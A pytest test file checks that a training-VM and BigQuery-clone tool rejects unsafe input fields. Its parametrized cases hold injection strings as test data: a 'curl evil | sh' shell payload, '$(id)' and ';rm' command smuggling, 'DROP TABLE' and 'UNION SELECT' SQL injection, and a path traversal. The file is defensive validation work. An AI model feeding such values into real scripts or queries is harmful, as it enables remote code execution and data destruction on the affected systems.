"""Boundary validation for values that end up in a root bash startup script
(train-on-vm) or in a BigQuery SQL string / gcloud argv (data clone-bq)."""

from __future__ import annotations

import pytest
from pydantic import ValidationError

from deepcab_platform.schemas.data import DataCloneBqInputs
from deepcab_platform.schemas.train import TrainOnVmInputs


@pytest.mark.parametrize(
    "field,value",
    [
        ("image_tag", 'v1"; curl evil | sh; echo "'),
        ("image_tag", "v1$(id)"),
        ("image_tag", ""),
        ("zone", "europe-west1-b --project=other"),
        ("machine_type", "n1-standard-4 x"),
        ("max_runtime", "6h;rm"),
    ],
)
def test_train_inputs_reject_shell_metacharacters(field: str, value: str) -> None:
    with pytest.raises(ValidationError):
        TrainOnVmInputs(**{field: value})


def test_train_inputs_accept_defaults_and_realistic_values() -> None:
    TrainOnVmInputs()
    TrainOnVmInputs(image_tag="v1.2.3-rc_1", zone="us-central1-a",
                    machine_type="a2-highgpu-1g", max_runtime="90m")


@pytest.mark.parametrize(
    "field,value",
    [
        ("target_project", "garassino-ml`; DROP TABLE x; --"),
        ("target_dataset", "taxi.other"),
        ("target_table", "t` UNION SELECT 1 --"),
        ("staging_bucket_us", "bucket/../../other"),
        ("staging_bucket_eu", "Bad Bucket"),
    ],
)
def test_data_clone_inputs_reject_unsafe_identifiers(field: str, value: str) -> None:
    with pytest.raises(ValidationError):
        DataCloneBqInputs(**{field: value})


def test_data_clone_inputs_accept_defaults() -> None:
    DataCloneBqInputs()
